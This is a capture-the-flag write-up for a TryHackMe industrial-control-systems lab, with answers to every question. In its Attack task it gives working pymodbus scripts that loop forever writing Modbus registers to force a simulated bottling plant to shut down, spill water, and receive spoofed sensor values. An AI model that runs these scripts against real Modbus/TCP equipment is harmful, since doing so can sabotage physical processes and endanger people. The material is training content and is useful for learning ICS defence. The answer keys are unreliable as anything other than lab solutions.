---
description: https://tryhackme.com/room/attackingics1
---

# Attacking ICS Plant #1

## Task 2 Introduction to Modbus protocol

#### Which is the function used to read holding registers in pymodbus library?

![https://pymodbus.readthedocs.io/en/latest/source/library/pymodbus.client.html](<../../.gitbook/assets/Screenshot from 2022-02-20 08-56-59.png>)

{% hint style="success" %}
`read_holding_registers`
{% endhint %}

#### Which is the function used to write holding registers in pymodbus library?

![https://pymodbus.readthedocs.io/en/latest/source/library/pymodbus.client.html](<../../.gitbook/assets/Screenshot from 2022-02-20 09-00-38.png>)

{% hint style="success" %}
`write_register`
{% endhint %}

## Task 3 Discovery

![](<../../.gitbook/assets/Screenshot from 2022-02-20 09-07-07.png>)

#### How many phases can we observe?

{% hint style="success" %}
`3`
{% endhint %}

#### How many sensors can we observe?

{% hint style="success" %}
`2`
{% endhint %}

#### How many actuators can we observe?

{% hint style="success" %}
`3`
{% endhint %}

#### Using the script discovery.py, how many registers can we count?

```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
    rr = client.read_holding_registers(1, 16)
    print(rr.registers)
    time.sleep(1)
```

![](<../../.gitbook/assets/Screenshot from 2022-02-20 09-22-58.png>)

{% hint style="success" %}
`16`
{% endhint %}

#### After the plant is started and a bottle is loaded, how many registers are continuously changing their values?

{% hint style="success" %}
`4`
{% endhint %}

#### Which is the minimum observed value?

{% hint style="success" %}
`0`
{% endhint %}

#### Which is the maximum observed value?

{% hint style="success" %}
`1`
{% endhint %}

#### Which registry is holding its value?

{% hint style="success" %}
`16`
{% endhint %}

#### Which registries are set to 1 while the nozzle is filling a bottle?

{% hint style="success" %}
`2 4`
{% endhint %}

#### Which registries are set to 1 while the roller is moving the bottles?

{% hint style="success" %}
`1 3`
{% endhint %}

#### Which is the color of the water level sensor?

{% hint style="success" %}
`red`
{% endhint %}

#### Which is the color of the bottle sensor?

{% hint style="success" %}
`green`
{% endhint %}

#### If you observe the plant at the very beginning, which is the registry associated with the roller?

{% hint style="success" %}
`3`
{% endhint %}

#### Based on the previous answer, which is the registry associated with the water level sensor?

{% hint style="success" %}
`1`
{% endhint %}

## Task 4 Play to learn

#### Which is the registry associated with the nozzle?

```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
registry = int(sys.argv[2])
value = int(sys.argv[3])
client = ModbusClient(ip, port=502)
client.connect()
client.write_register(registry, value)
```

![python3 set\_registry.py 10.10.199.95 4 1](<../../.gitbook/assets/Screenshot from 2022-02-20 09-56-51.png>)

{% hint style="success" %}
`4`
{% endhint %}

## Task 5 Attack

#### Shutdown the plant and avoid the plant manager starts it again.&#x20;

```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
  client.write_register(3, 0)  # Stop the motor
  client.write_register(4, 0)  # Close the nozzle
  client.write_register(16, 0) # Shutdown the plant
```

#### Start the plant, open the nozzle while bottles are moving.

```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
  client.write_register(3, 1)  # Start the roller
  client.write_register(4, 1)  # Open the nozzle
  client.write_register(16, 1) # Start the plant
```

#### Start the plant, open the nozzle and stop the rollet.

```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
  client.write_register(3, 0)  # Stop the roller
  client.write_register(4, 1)  # Open the nozzle
  client.write_register(16, 1) # Start the plant
```

#### Repeat attack in question 1 abusing sensor registries.

```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
  client.write_register(1, 0)  # Bottle is not filled
  client.write_register(2, 0)  # Bottle is under the nozzle
  client.write_register(3, 0)  # Stop the motor
  client.write_register(4, 0)  # Close the nozzle
  client.write_register(16, 0) # Shutdown the plant
```

#### Repeat attack in question 2 abusing sensor registries.

```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
  client.write_register(1, 0)  # Bottle is not filled
  client.write_register(2, 0)  # Bottle is not under the nozzle
  client.write_register(3, 1)  # Start the roller
  client.write_register(4, 1)  # Open the nozzle
  client.write_register(16, 1) # Start the plant
```

#### Repeat attack in question 3 abusing sensor registries.

```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
  client.write_register(1, 0)  # Bottle is not filled
  client.write_register(2, 1)  # Bottle is under the nozzle
  client.write_register(3, 0)  # Stop the roller
  client.write_register(4, 1)  # Open the nozzle
  client.write_register(16, 1) # Start the plant
```
